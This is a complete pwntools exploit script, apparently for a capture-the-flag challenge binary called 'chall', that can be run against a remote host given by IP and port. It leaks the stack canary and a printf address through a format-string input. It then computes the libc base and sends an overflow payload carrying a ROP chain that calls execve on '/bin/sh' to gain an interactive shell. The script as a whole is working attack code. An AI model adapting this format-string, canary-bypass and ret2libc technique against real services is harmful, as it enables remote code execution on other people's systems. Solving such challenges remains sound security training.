#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall_patched')
libc = ELF("./libc.so.6")



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote( "34.107.71.117", 31456 )
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
br *coffee+56
br *coffee+149
br *coffee+187
continue
'''.format(**locals())


io = start()

canary_offset = 24
rip_offset = 40

io.sendlineafter(b"$ ", b"%9$lx")
canary = int(io.recv(16).decode(), 16)
log.info(f"Canary: {hex(canary)}")
printf = int(io.recvline().strip().decode().split()[-1], 16)
log.info(f"Printf: {hex(printf)}")

libc.address = printf - libc.sym.printf
rop = ROP(libc)
#rop.system(next(libc.search(b"/bin/sh\x00")))
rop.call(libc.sym.execve, [next(libc.search(b"/bin/sh\x00")),0])

payload = fit({
        canary_offset: p64(canary), 
        rip_offset: rop.chain(),
        })
io.sendlineafter(b"$ ", payload)

io.interactive()

